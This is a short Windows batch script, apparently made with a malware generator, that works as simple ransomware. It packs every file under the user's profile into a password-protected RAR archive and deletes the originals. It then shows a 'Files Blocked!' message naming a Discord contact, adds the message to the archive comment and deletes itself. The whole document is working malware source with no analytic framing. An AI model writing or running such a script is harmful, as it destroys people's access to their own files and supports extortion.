@echo off
set filename="LOCK.rar"
set commentsfile=info.txt
set pass="EnjoyDogDev"
set comment="Files Blocked! CONTACT: Discord EviRain 9999"
msg * %comment%
"%PROGRAMFILES%\WinRAR\Rar.exe" a -r -y -ri15 -df -m0 -inul -p%pass% %filename%
"%USERPROFILE%\*"
echo %comment% >> %commentsfile%
"%PROGRAMFILES%\WinRAR\Rar.exe" c %filename% -z%commentsfile%
del %0
rem Created by: Generator Death by upO [5.0]
rem http://x3-team.ru/
